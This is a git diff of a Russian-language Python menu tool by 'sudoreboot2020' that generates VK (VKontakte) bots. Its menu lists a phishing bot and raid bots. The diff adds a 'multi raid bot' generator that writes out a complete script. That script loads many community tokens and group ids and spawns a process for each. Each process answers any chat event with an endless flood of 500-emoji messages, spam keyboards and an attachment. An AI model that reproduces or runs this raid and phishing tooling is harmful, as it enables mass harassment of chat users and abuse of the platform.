@@ -1,21 +1,37 @@
 import os,sys
 import colorama
 from colorama import init
+import random
 os.system('clear')
-print("""\033[34m
+baners = [
+"""\033[34m╔╗────╔╗─╔╗─╔╗────╔╗──────
+║╚╗╔═╗║╚╗║╚╗╠╣╔╗─╔╝║╔═╗╔╦╗
+║╬║║╬║║╔╣║╬║║║║╚╗║╬║║╩╣║╔╝
+╚═╝╚═╝╚═╝╚═╝╚╝╚═╝╚═╝╚═╝╚╝─\033[39m"""    ,
+"""\033[35m█▀▄ ▄▀▄ ▀█▀ █▀▄ ▀ █░░ █▀▄ █▀▀ █▀▀▄ 
+█▀█ █░█ ░█░ █▀█ █ █░▄ █░█ █▀▀ █▐█▀ 
+▀▀░ ░▀░ ░▀░ ▀▀░ ▀ ▀▀▀ ▀▀░ ▀▀▀ ▀░▀▀ 
+\033[39m""",
+"""\033[31m╔╦═╦╦══╦══╦═╦╦╦╦╦═╦╦═╦══╦╗
+║║░╩╣╔╗╠╣╠╣░╩╣║║║║╚╣═╣░░║║
+║║░░║╚╝║║║║░░║║╚╣║╔╣═╣╔╗╣║
+║╚══╩══╝╚╝╚══╩╩═╩═╝╚═╩╝╚╝║
+╚════════════════════════╝\033[39m"""
 
-.----.  .----.  .---.    .----. .-..-.   .----. .----..----. 
-| {}  }/  {}  \{_   _}   | {}  }| || |   | {}  \| {_  | {}  }
-| {}  }\      /  | |     | {}  }| || `--.|     /| {__ | .-. \
-`----'  `----'   `-'     `----' `-'`----'`----' `----'`-' `-'
 
-\033[39m""")
+
+
+
+
+          ]
+print(random.choice(baners))
 print('\033[34mАвтор : sudoreboot2020\033[39m')
 
 print("""\033[34m
 [1] - обычный lite бот
 [2] - бот для фишинга 
 [3] - Рейд бот
+[4] - Мульти рейд бот
 [99] - Выход
 \033[39m""")
 while True:
@@ -167,7 +183,7 @@ while True:
     except Exception as E:
         time.sleep(1)""")
             n.close()
-            print('[>]Фишинг бот готов!\033[32m')
+            print('\033[32m[>]Фишинг бот готов!\033[39m')
             break
         except UnicodeEncodeError:
             pass
@@ -342,6 +358,117 @@ while True:
         n.close()
         print('\033[32m[>]Рейд бот готов!\033[39m')
         break
+
+
+    elif e == ('4'):
+        lol = str(input("""\033[31m[1] - создать бота
+[2] - добавть группу
+[-->]\033[39m"""))
+        if lol == ('1'):
+            name = str(input('Введите имя файла , в который сохранится бот(по умолчанию: multi.py)'))
+            if name == '':
+                name = 'multi.py'
+            kek = open (name,'w',encoding='utf-8')
+            kek.write(r"""import pip, requests, multiprocessing, time, random    
+
+
+def readtokens(filename):
+    with open(filename, 'r') as fin:
+        tokens = []
+        for i in fin:
+            if '\n' in i:
+                i = i[0:-1]
+            if i != '':
+                tokens.append(i)
+        return(tokens)
+
+def readids(filename):
+    with open(filename, 'r') as fin:
+        ids = []
+        for i in fin:
+            if '\n' in i:
+                i = i[0:-1]
+            if i != '':
+                ids.append(i)
+        return(ids)
+
+
+b = '[{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}},{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}},{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}}]'
+a = '{"one_time":false,"inline":false,"buttons":[' + b + "," + b + "," + b + "," + b + "," + b + "," + b + "," + b + "," + b + ']}'
+
+def bot(token, gid, raidmessage, raidkeyboard):
+    import emoji
+    import vk_api
+    import random
+    from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
+    work = True
+    try:
+        vk_session = vk_api.VkApi(token=token)
+        api = vk_session.get_api()
+        longpoll = VkBotLongPoll(vk_session, group_id = gid)
+    except:
+        print("Не удалось авторизоваться группой с id = " + gid + " и токеном = " + token)
+        work = False
+    if work:
+        print("Авторизация группы с id = " + gid + " прошла успешно!")
+        while True:
+            try:
+                for event in longpoll.listen():
+                    try:
+                        a = str(event)
+                        b = a.find("'peer_id': ")
+                        c = a[b + 11:]
+                        d = c.find(",")
+                        peerid = int(c[:d])
+                        usid = peerid - 2000000000
+                        while True:
+                            api.messages.send(
+                                        chat_id=usid,
+                                        message=raidmessage,
+                                        random_id=random.randint(1,999999999),
+                                        keyboard = raidkeyboard,
+                                        attachment="wall-189508183_4")
+                    except:
+                        print('ERROR IN ' + str(gid))
+            except:
+                pass
+if __name__ == "__main__":
+    try:
+        import emoji
+        em = emoji.UNICODE_EMOJI
+        lst = []
+        rmsgg1 = ''
+        for i in em:
+            lst.append(i)
+        for i in range(500):
+            f = lst[random.randint(1, len(lst))]
+            rmsgg1 += f
+        tokens = readtokens('tokens.txt')
+        ids = readids('ids.txt')
+        if tokens == []:
+            print("Пожалуйста, перечитайте readme и следуйте инструкциям. Программе не удалось обнаружить ни одного токена в файле 'tokens.txt'")
+        if ids == []:
+            print("Пожалуйста, перечитайте readme и следуйте инструкциям. Программе не удалось обнаружить ни одного id в файле 'ids.txt'")
+        for i in range(len(tokens)):
+            p = multiprocessing.Process(target=bot, args=[tokens[i], ids[i], rmsgg1, a])
+            p.start()
+    except:
+        print("Запусти меня еще раз, у меня на*бнулся генератор эмоди.")
+""")
+            kek.close()
+            print('\033[32m[>>]БОТ готов и сохранен под файлом %s'%name)
+            break
+        elif lol == ('2'):
+            tokenn = str(input('Ведите токен сообщества:'))
+            ids = int(input('Введите числовой id сообщества ↑↑↑:'))
+            t = open ('tokens.txt','a+')
+            ids_f = open ('ids.txt','a+')
+            ids_f.write(str(ids)+'\n')
+            t.write(str(tokenn)+'\n')
+            ids_f.close()
+            t.close()
+            print('\033[32m[>>]Запись завершена!\033[39m')
+            print('Для выхода нажмите <<99>>')
     elif e == ('99'):
         print("\033[31mДо новой встречи!\033[39m")
         break
